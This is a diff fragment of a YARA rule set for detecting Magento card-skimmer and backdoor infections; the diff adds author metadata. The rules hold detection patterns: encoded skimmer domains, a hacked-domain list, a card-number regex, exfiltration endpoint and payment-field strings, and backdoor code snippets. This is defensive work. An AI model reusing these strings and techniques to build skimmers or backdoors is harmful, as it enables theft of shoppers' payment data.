     strings: $ = "\x2F\x6D\x65\x64\x69\x61\x2F\x63\x61\x74\x61\x6C\x6F\x67\x2F\x70\x72\x6F\x64\x75\x63\x74\x2F\x63\x61\x63\x68\x65\x2F\x31\x2F\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x2F\x37\x30\x30\x78\x2F\x32\x62\x66\x38\x66\x32\x62\x38\x64\x30\x32\x38\x63\x63\x65\x39\x36\x2F\x42\x2F\x57\x2F\x64\x61\x34\x31\x38\x30\x33\x63\x63\x39\x38\x34\x62\x38\x63\x2E\x70\x68\x70"
     condition: any of them
 
 }
 rule ip_5uu8_com
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "\x69\x70\x2e\x35\x75\x75\x38\x2e\x63\x6f\x6d"
     condition: any of them
 
 }
 rule cloudfusion_me
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;"
     condition: any of them
 
 }
 rule grelos_v
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "var grelos_v"
     condition: any of them
 
 }
 rule hacked_domains
 {
+meta:
+		author = "Byte.nl"
     strings: 
         $ = "infopromo.biz"
         $ = "jquery-code.su"
@@ -1999,29 +1965,39 @@ rule hacked_domains
 }
 rule mage_cdn_link
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "\x6D\x61\x67\x65\x2D\x63\x64\x6E\x2E\x6C\x69\x6E\x6B"
     condition: any of them
 
 }
 rule credit_card_regex
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "RegExp(\"[0-9]{13,16}\")"
 condition: any of them
 }
 rule jquery_code_su
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "105,102,40,40,110,101,119,32,82,101,103,69,120,112,40,39,111,110,101,112,97,103,101"
     condition: any of them
 
 }
 rule jquery_code_su_multi
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "=oQKpkyJ8dCK0lGbwNnLn42bpRXYj9GbENDft12bkBjM8V2Ypx2c8Rnbl52bw12bDlkUVVGZvNWZkZ0M85WavpGfsJXd8R1UPB1NywXZtFmb0N3box"
     condition: any of them
 
 }
 rule gate_php_js
 {
+meta:
+		author = "Byte.nl"
     strings: 
 		$ = "/gate.php?token="
 		$ = "payment[cc_cid]"
@@ -2030,30 +2006,40 @@ rule gate_php_js
 }
 rule googieplay_js
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "tdsjqu!tsd>#iuuq;00hpphjfqmbz/jogp0nbhfoup`hpphjfqmbz/kt#?=0tdsjqu?"
     condition: any of them
 
 }
 rule mag_php_js
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "onepage|checkout|onestep|firecheckout|onestepcheckout"
     condition: any of them
 
 }
 rule thetech_org_js
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "|RegExp|onepage|checkout|"
     condition: any of them
 
 }
 rule md5_cdn_js_link_js
 {
+meta:
+		author = "Byte.nl"
     strings: $ = "grelos_v= null"
     condition: any of them
 
 }
 rule backup_backdoor
 {
+meta:
+		author = "MageMojo"
     strings:
         $ = "function onESs($NTlWmu)"
     condition: any of them
@@ -2061,6 +2047,8 @@ rule backup_backdoor
 }
 rule mailhijacker
 {
+meta:
+		author = "MageMojo"
     strings:
         $ = "public function check($email, $pwd){"
     condition: any of them
@@ -2068,6 +2056,8 @@ rule mailhijacker
 }
 rule adminhijacker
 {
+meta:
+		author = "MageMojo"
     strings:
         $ = "\"Admin From \".$_SERVER['HTTP_HOST']"
     condition: any of them
@@ -2075,6 +2065,8 @@ rule adminhijacker
 }
 rule modgit_backdoor
 {
+meta:
+		author = "MageMojo"
     strings:
         $ = "isset($_POST['_']))@setcookie('_', $_POST['_']);"
     condition: any of them
